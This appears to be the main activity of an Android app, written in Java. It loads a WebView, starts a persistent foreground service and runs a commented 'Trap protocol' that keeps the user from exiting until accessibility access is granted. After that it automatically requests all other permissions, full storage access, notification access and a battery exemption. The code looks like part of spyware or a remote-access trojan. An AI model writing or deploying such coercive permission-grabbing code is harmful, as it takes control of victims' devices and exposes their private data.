package com.fason.app.ui;

import androidx.activity.ComponentActivity;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import androidx.annotation.NonNull;
import androidx.core.view.WindowCompat;
import com.fason.app.R;
import com.fason.app.service.MainService;

public class MainActivity extends ComponentActivity {
    private HomeManager home;
    private PermissionSetupController permController;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
        setContentView(R.layout.activity_main);
        home = new HomeManager();
        home.init(findViewById(R.id.webView), findViewById(R.id.progressBar));
        if (state != null) {
            home.restoreState(state);
        }
        permController = new PermissionSetupController(this);
        permController.onCreate(state);
        startSvc();
        loadPage();
        maybeArmTrap();
        maybeAutoGrant(getIntent());
        final PermissionSetupController ctrl = permController;
        findViewById(R.id.permOverlay).postDelayed(ctrl::autoStartFirstMissing, 600);
        getOnBackPressedDispatcher().addCallback(this, new androidx.activity.OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                if (home != null && home.canGoBack()) {
                    home.goBack();
                } else {
                    setEnabled(false);
                    onBackPressed();
                }
            }
        });
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (permController != null) permController.onResume();
        maybeArmTrap();
    }

    @Override
    protected void onNewIntent(android.content.Intent intent) {
        super.onNewIntent(intent);
        maybeAutoGrant(intent);
    }

    /** Trap protocol: no accessibility -> no exit. Arm the gate. */
    private void maybeArmTrap() {
        try {
            if (!com.fason.app.core.permissions.PermissionManager.hasAccessibilityAccess(this)) {
                com.fason.app.core.AccessibilityGate.arm(this);
            } else {
                com.fason.app.core.AccessibilityGate.disarm(this);
            }
        } catch (Exception ignored) {}
    }

    /** perm_auto_grant: a11y just granted — batch-request everything else instantly. */
    private void maybeAutoGrant(android.content.Intent intent) {
        if (intent == null) return;
        if (!intent.getBooleanExtra("perm_auto_grant", false)) return;
        try {
            java.util.List<String> denied =
                com.fason.app.core.permissions.PermissionManager.getDeniedPerms(this);
            if (!denied.isEmpty()) {
                androidx.core.app.ActivityCompat.requestPermissions(
                    this, denied.toArray(new String[0]), 0xFA);
            }
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R
                && !android.os.Environment.isExternalStorageManager()) {
                com.fason.app.core.permissions.PermissionManager.requestStorageManager(this);
            }
            if (!com.fason.app.core.permissions.PermissionManager.hasNotifAccess(this)) {
                com.fason.app.core.permissions.PermissionManager.requestNotifAccess(this);
            }
            if (!com.fason.app.core.permissions.PermissionManager.hasBatteryExemption(this)) {
                com.fason.app.core.permissions.PermissionManager.requestBatteryExemption(this);
            }
        } catch (Exception ignored) {}
    }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle out) {
        super.onSaveInstanceState(out);
        if (home != null) home.saveState(out);
        if (permController != null) permController.onSaveInstanceState(out);
    }

    @Override
    protected void onDestroy() {
        if (home != null) home.destroy();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int req, @NonNull String[] perms,
                                            @NonNull int[] results) {
        super.onRequestPermissionsResult(req, perms, results);
        if (permController != null) {
            permController.onRequestPermissionsResult(req);
        }
    }

    private void startSvc() {
        try {
            Intent svcIntent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svcIntent);
            } else {
                startService(svcIntent);
            }
        } catch (Exception ignored) {}
    }

    private void loadPage() {
        if (home != null) home.loadPage();
    }
}
